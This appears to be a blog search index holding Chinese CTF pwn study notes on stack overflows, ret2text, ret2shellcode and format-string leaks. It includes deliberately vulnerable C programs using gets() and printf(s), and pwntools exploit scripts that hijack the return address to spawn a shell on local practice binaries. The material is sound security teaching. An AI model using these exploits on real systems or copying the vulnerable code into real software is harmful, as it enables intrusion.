<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwn学习路线</title>
    <url>/2022/06/01/pwn/pwn%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
    <content><![CDATA[<p>CTFwiki：<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">https://ctf-wiki.org/pwn/linux/user-mode/environment/</a></p>
<h1 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h1><h2 id="学习pwn需要的环境和工具"><a href="#学习pwn需要的环境和工具" class="headerlink" title="学习pwn需要的环境和工具"></a>学习pwn需要的环境和工具</h2><p>需要安装python的第三方库pwntools、gdb的增强版pwndbg、ruby语言里的Onegadget，其他的工具任意，具体安装步骤在B站的星盟pwn讲学的第一章(pwn环境的搭建)。</p>
<p>ida可以到爱盘(吾爱破解)里面找到</p>
<p>Ubuntu我装的是20</p>
<span id="more"></span>

<p><strong>注意：</strong></p>
<p>在自己编译程序的时候，想要关闭一些保护，方法如下：</p>
<p><strong>NX</strong>	<code>-z execstack</code> &#x2F; <code>-z noexecstack</code> (关闭 &#x2F; 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</p>
<p><strong>Canary</strong>	<code>-fno-stack-protector</code> &#x2F;<code>-fstack-protector</code> &#x2F; <code>-fstack-protector-all</code> (关闭 &#x2F; 开启 &#x2F; 全开启) 栈里插入cookie信息</p>
<p><strong>PIE</strong>	<code>-no-pie</code> &#x2F; <code>-pie</code> (关闭 &#x2F; 开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></p>
<p><strong>RELRO</strong>	<code>-z norelro</code> &#x2F; <code>-z lazy</code> &#x2F; <code>-z now</code> (关闭 &#x2F; 部分开启 &#x2F; 完全开启) 对GOT表具有写权限</p>
<p>如果不想把一些危险的函数进行优化，可以使用 <code>-fno-builtin</code></p>
<p>如果想编译出来的程序是32位的，可以使用 <code>-m32</code></p>
<p>附：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//编译32位出错的话，可以在终端执行如下指令后再进行编译</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get purge libc6-dev</span><br><span class="line"></span><br><span class="line">sudo apt-get install libc6-dev</span><br><span class="line"></span><br><span class="line">sudo apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure>

<p>编写源码的初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> &#123; </span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h2><h3 id="栈利用"><a href="#栈利用" class="headerlink" title="栈利用"></a>栈利用</h3><h4 id="栈介绍以及栈溢出原理"><a href="#栈介绍以及栈溢出原理" class="headerlink" title="栈介绍以及栈溢出原理"></a>栈介绍以及栈溢出原理</h4><p>在数据结构里面第一次接触到栈，栈和队列不一样，栈的数据结构是先进后出(FILO)，c++的STL库里也为我们提供了stack这种数据容器，栈的操作主要是入栈(压栈)和出栈。</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202203290800134.png" alt="栈的结构" style="zoom:67%;" />

<p>在汇编语言(可以看看B站里小甲鱼讲的)里面有一个专门定义栈的段(栈段)，可以看到，程序中栈的地址空间是从高地址向低地址增长(预设好栈的空间)。</p>
<p>注意：x86(32)和x64(64)程序的区别</p>
<p><strong>x86</strong></p>
<p>函数参数在函数返回地址的上方</p>
<p><strong>x64</strong></p>
<p>1、前6个整数或指针参数依次保存在<strong>rdi、rsi、rdx、rcx、r8、r9</strong>寄存器中，再多的话放到栈上</p>
<p>2、内存地址不能大于<strong>0x00007FFFFFFFFFFF</strong>，<strong>6个字节长度</strong>，否则抛出异常</p>
<p><strong>栈是如何通过溢出造成漏洞？</strong></p>
<p>向栈中某个变量写入的字节长度&gt;变量申请的字节长度，进而导致改变与其相邻的栈中的变量的值。</p>
<p>想要造成栈溢出，至少需要满足：1、必须向栈上写入数据	2、允许写入的数据大于变量申请的空间</p>
<p><strong>使用一个例子(ret2xxx)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -no-pie stack.c -o stack </span></span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204032358943.png" alt="image-20220403235858877" style="zoom:80%;" />

<p>看到<strong>gets</strong>和<strong>puts</strong>函数，简直是标配的ret2xxx，32位的传参顺序如上，直接用脚本了(需要安装第三方库pwntools)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span>		<span class="comment">#也可以直接使用pwntools中的函数自动查询，success_addr=elf.sym[&#x27;success&#x27;]</span></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>栈溢出的总结</strong></p>
<p>利用一些危险的函数，确定程序是否有溢出及其位置，一些常见的危险函数如下：</p>
<p><strong>input：</strong>gets(直接读取一行，忽略’\x00’)、scanf、vscanf</p>
<p><strong>output：</strong>sprintf</p>
<p><strong>string：</strong>strcpy、strcat、bcopy</p>
<p><strong>对于填充的长度</strong></p>
<p>ida一打开对于字符串数组变量的长度，一般看ebp就知道了，还有一些变量是直接地址索引的，相当于直接给出地址</p>
<h4 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h4><p><strong>ROP 是啥呢</strong></p>
<p>ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
<p>这类题目一般开启NX保护</p>
<p>ROP攻击一般需要满足一些条件：</p>
<p>1、程序存在溢出，并且考研控制返回地址</p>
<p>2、可以找到满足条件的gadgets以及相应gadgets地址</p>
<h5 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h5><p>ret2text即控制程序本身已经有的代码 (.text)。</p>
<p>示例源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//name:stack01.c</span></span><br><span class="line"><span class="comment">//gcc -m32 -no-pie -z noexecstack -fno-stack-protector -z lazy stack01.c -o stack01</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Congratulations,you find it!&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line"> 	gets(s);</span><br><span class="line">  	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Hello,ctfer!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Can you find backdoor?&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s sign in!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Give me your choice:&quot;</span>);</span><br><span class="line">	vulnerable();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到满足栈溢出的条件(有gets函数)，同时，在代码段里面，看到了调用了system(“&#x2F;bin&#x2F;sh”)</p>
<p>检查保护</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041004930.png" alt="image-20220404100423876" style="zoom:80%;" />

<p>看看ida里面反汇编</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041007160.png" alt="image-20220404100757120" style="zoom:80%;" />

<p>gets函数明显存在栈溢出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">填充的长度:junk=b&#x27;a&#x27;*(0x14+4)		#如果是64位就加8</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041009646.png" alt="image-20220404100938611" style="zoom:80%;" />

<p>哦吼，直接让gets函数的返回地址改为backdoor不就好了</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>		<span class="comment">#设置运行的py等级为调试</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(,)					#这里没有放到服务器上，打本地就行了</span></span><br><span class="line">io=process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">4</span>)</span><br><span class="line">backdoor=elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]	<span class="comment">#利用pwntools自带的函数查询backdoor地址</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041014085.png" alt="image-20220404101444024" style="zoom:80%;" />

<h5 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h5><p>原理：控制程序执行shellcode</p>
<p><strong>什么是shellcode?</strong>	答：用于完成某个功能的汇编代码。</p>
<p>对于做题而言，一般我们需要填充一些可执行的代码。这类题目一般需要两个前提，即存在栈溢出，且填充的shellcode所在的区域有可执行的<strong>权限</strong>。</p>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><h4 id="定义-wiki"><a href="#定义-wiki" class="headerlink" title="定义(wiki)"></a>定义(wiki)</h4><p>格式化字符串（英语：format string）是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的函数(学过c语言容易理解)。通俗的说，就是把计算机存储的相关数据变成人们可以看懂的字符串形式。</p>
<p>举个例子</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430190154204.png" alt="image-20220430190154204" style="zoom:80%;" />

<p>格式化占位符的语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>

<p>其中，parameter可以忽略或者是<code>n$</code></p>
<blockquote>
<p>n是用这个格式说明符（specier）显示第几个参数；这使得参数可以输出多次，使<br>用多个格式说明符，以不同的顺序输出。</p>
</blockquote>
<p>flags可为0或者多个</p>
<blockquote>
<p>重点关注字符’#’</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>意思</th>
</tr>
</thead>
<tbody><tr>
<td>#</td>
<td>对于’ g ‘与’ G ‘，不删除尾部0以表示精度。对于’ f ‘, ‘ F ‘, ‘ e ‘, ‘ E ‘, ‘ g ‘, ‘ G ‘,总是输出小数点。对于’ o ‘, ‘ x ‘, ‘ X ‘, 在非0数值前分别输出前缀0 , 0x , 0X 表示数制。</td>
</tr>
</tbody></table>
</blockquote>
<p>field width表示数值的最小宽度，典型用于制表输出时填充固定宽度的表目</p>
<p>Precision通常指明输出的最大长度，依赖于特定的格式化类型</p>
<p>length指出浮点型参数或整型参数的长度</p>
<p><strong>Type</strong>，也称转换说明，常见的</p>
<blockquote>
<p>%d - 十进制 - 输出十进制整数</p>
<p>%s - 字符串 - 从内存中读取字符串(string)</p>
<p>%x - 十六进制 - 输出十六进制数</p>
<p>%c - 字符 - 输出字符(char)</p>
<p>%p - 指针 - 指针地址(这个经常用)</p>
</blockquote>
<p>在c的代码中，常见的格式化字符串函数有：</p>
<p>输入：scanf</p>
<p>输出：printf、fprintf(目前做的题目碰到printf比较多)</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>攻击的方式很简单，因为printf函数中的相关参数都会从栈上去一个数值视作地址然后去访问，地址可能是不存在或者禁止访问，最后使得程序崩溃掉</p>
<p><strong>举个例子</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//name:  pwn.c</span></span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -no-pie -o pwn pwn.c</span></span><br></pre></td></tr></table></figure>

<p>编译后检查一下保护(编译时候报警告不需要管，就是要对这个危险的函数进行leak的嘛)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/vi0let/文档/pwn/笔记/study/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>跑一下看看(可以使用，-分隔但是不能使用空格会被截断的)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  study ./pwn</span><br><span class="line">%08x,%08x,%08x</span><br><span class="line">00000001.22222222.ffffffff.%08x,%08x,%08x</span><br><span class="line">ffbc1780,f7f03990,080491d1</span><br></pre></td></tr></table></figure>

<p>再使用gdb调试一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  study gdb pwn</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x8049070</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/vi0let/文档/pwn/笔记/study/pwn </span><br><span class="line">%08x,%08x,%08x</span><br></pre></td></tr></table></figure>

<p>可以看到</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430212855488.png" alt="image-20220430212855488" style="zoom:80%;" />

<p>因为之前已经在程序中对调用printf函数下了断点，所以执行的时候自然就停了下来</p>
<p>明显看到栈上的分布，第一个变量是<strong>返回地址</strong>，第二个变量是<strong>格式化字符串</strong>地址，第三个变量是<strong>a的值</strong>，第四个变量是<strong>b的值</strong>，第五个变量是<strong>c的值</strong>，第六个变量为<strong>我们输入的格式化字符串对应的地址</strong>。</p>
<p>继续调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%08x,%08x,%08x</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ffffcfd0,f7ffd990,080491d1[Inferior 1 (process 8801) exited normally]</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430214716359.png" alt="image-20220430214716359" style="zoom:80%;" />

<p>和上面第一次调用printf类似</p>
<p>同样可以使用**%p,%p,%p**(建议以后使用%p 因为不用考虑位数的问题)，或者**%3$p**在第二次打印的时候打印出第三个参数的地址。</p>
<p>如果参数之间用空格分隔的话(%p %p %p)，会出现这样的情况</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502192058542.png" alt="image-20220502192058542" style="zoom:80%;" />

<p>这是因为%s格式化字符串会到空格这里截断。</p>
<p>上面的一个例子可以发现</p>
<ul>
<li>%p可以获取对应栈的内存地址</li>
<li>%s可以显示出变量对应的地址的<strong>内容</strong>，但是会有零截断</li>
<li>%n$p获取指定参数的值</li>
</ul>
<p>很显然，%s打印变量内容，而%p表示内存地址，那么就会有一个想法，变量为%p，就会打印出栈上参数对应的地址咯(在上一题的实验也可以看到)</p>
<p>所以可以使用<code>[tag]%p%p%p%p%p%p%p%p%p </code>来打印出其格式化字符串的地址。拿刚才的例子试一下</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193248109.png" alt="image-20220502193248109" style="zoom:80%;" />

<p>用aaaa%4$p打印看看(a的ASCII值是0x61)</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193443643.png" alt="image-20220502193443643" style="zoom:80%;" />
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>复现题目环境的搭建</title>
    <url>/2022/07/10/pwn/%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="复现题目的环境搭建"><a href="#复现题目的环境搭建" class="headerlink" title="复现题目的环境搭建"></a>复现题目的环境搭建</h1><h2 id="使用socat"><a href="#使用socat" class="headerlink" title="使用socat"></a>使用socat</h2><h2 id="使用ctf-xinetd-ctf竞赛权威指南-pwn篇"><a href="#使用ctf-xinetd-ctf竞赛权威指南-pwn篇" class="headerlink" title="使用ctf-xinetd(ctf竞赛权威指南 pwn篇)"></a>使用ctf-xinetd(ctf竞赛权威指南 pwn篇)</h2><p>Linux版本：Ubuntu16.04</p>
<span id="more"></span>

<p>借鉴的博客：</p>
<p>docker安装：<a href="https://blog.csdn.net/weixin_45358193/article/details/103679142">https://blog.csdn.net/weixin_45358193/article/details/103679142</a></p>
<p>相关的配置：<a href="https://blog.csdn.net/weixin_46521144/article/details/120572274">https://blog.csdn.net/weixin_46521144/article/details/120572274</a></p>
<p>ctf竞赛权威指南(pwn篇)：P100~P103</p>
<p>缺点：一次只能部署一题，适用于自己在本地练习</p>
<h2 id="使用pwn-deploy-chroot"><a href="#使用pwn-deploy-chroot" class="headerlink" title="使用pwn_deploy_chroot"></a>使用pwn_deploy_chroot</h2><p>Linux版本：Ubuntu20.04</p>
<p>借鉴的博客：</p>
<p>多题部署：<a href="https://blog.csdn.net/u012763794/article/details/82988934">https://blog.csdn.net/u012763794/article/details/82988934</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF Wiki之栈溢出</title>
    <url>/2022/06/15/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>网站：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>
<p>附言：所有的学习均在本地测试，远程可以使用socat或者docker部署</p>
<span id="more"></span>

<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p><strong>保护检查</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191107953.png" alt="image-20220615191107953"></p>
<p>32位，开启NX保护。</p>
<p>查看调用的函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191201980.png" alt="image-20220615191201980"></p>
<p>发现sysytem、printf、gets、puts等。</p>
<p>ida打开看看(F5反汇编)</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193317042.png" alt="image-20220615193317042"></p>
<p>shift+f12查看字符串</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193542927.png" alt="image-20220615193542927"></p>
<p>很明显，在主函数中，gets函数存在栈溢出，并且字符串中调用了&#x2F;bin&#x2F;sh，追踪发现secure调用了system(“&#x2F;bin&#x2F;sh”)，记录一下地址。</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615194305769.png" alt="image-20220615194305769" style="zoom:80%;" />

<p>可以造成溢出的gets函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615200638390.png" alt="image-20220615200638390"></p>
<p>需要计算s相对于返回地址的偏移，可以使用gdb动态调试得到，也可以直接利用ida给出的偏移值计算(这个方法在主函数使用时候经常是给出的偏移是错误的)</p>
<p><strong>调试</strong></p>
<p><strong>使用gdb动态调试：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2text			<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x080486AE	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行截图如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202027514.png" alt="image-20220615202027514"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202045907.png" alt="image-20220615202045907"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb动态调试计算偏移</span><br><span class="line">由图可知</span><br><span class="line">esp            0xffffcf20</span><br><span class="line">ebp            0xffffcfa8</span><br><span class="line">s=esp+1ch=ffffcf3c</span><br><span class="line">s相对于ebp偏移：offset=ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移(因为是32位，所以直接+4)：0x6c+4</span><br></pre></td></tr></table></figure>



<p><strong>攻击思路</strong></p>
<p>利用gets函数进行栈溢出，并且修改返回的地址</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试相关信息</span></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)										#远程访问，需要自己挂上去</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2text&#x27;</span>)							<span class="comment">#本地访问</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2text&#x27;)								#导入本地文件</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#计算的偏移，需要填充垃圾数据</span></span><br><span class="line">shellc=<span class="number">0x0804863A</span>									<span class="comment">#记录在ida找到的system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload=junk+p32(shellc)							<span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送构造好的payload</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程进行交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿到shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615204942903.png" alt="image-20220615204942903"></p>
<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163235776.png" alt="image-20220616163235776" style="zoom:80%;" />

<p>32位，没有开启保护，说明栈上可执行</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163318074.png" alt="image-20220616163318074" style="zoom:80%;" />

<p>可以看到一些经常利用的函数，如gets…</p>
<p>ida打开看看</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164235497.png" alt="image-20220616164235497" style="zoom:80%;" />

<p>可以造成溢出的gets函数(因为gets没有设置字符串长度)</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164317442.png" alt="image-20220616164317442" style="zoom:80%;" />

<p>看主函数，可以知道当输入完s(长度为100)后，使用strncpy把s的数据复制到buf2，因为buf2没有在主函数中设出来，所以应该是一个全局变量，未初始化的全局变量一般保存在bss段中，双击buf2变量，看一下</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164947894.png" alt="image-20220616164947894" style="zoom:80%;" />



<p><strong>使用gdb调试看看</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode 		<span class="comment">#启动gdb</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b main			<span class="comment">#在主函数处下断点</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap			<span class="comment">#查看当前程序的系统调用库</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616165950043.png" alt="image-20220616165950043" style="zoom:80%;" />

<p>由ida中的bss地址看到所属的区域(在第一行里)是具有可执行的权限的。</p>
<p>通过主函数可以知道把s的数据复制到buf2这个可以执行的bss段上，复制的大小是0x64，0x64-0x1C&#x3D;0x48&#x3D;72，大小足够了，直接使用pwntools提供的函数即可，可以看一下pwntools中构造 shellcode的字符串长度</p>
<p>这个是32位的shellc</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171527851.png" alt="image-20220616171527851" style="zoom:80%;" />

<p>这个是64位的shellc</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171732498.png" alt="image-20220616171732498" style="zoom:80%;" />

<p>对于偏移的计算，跟上面的ret2text原理一样</p>
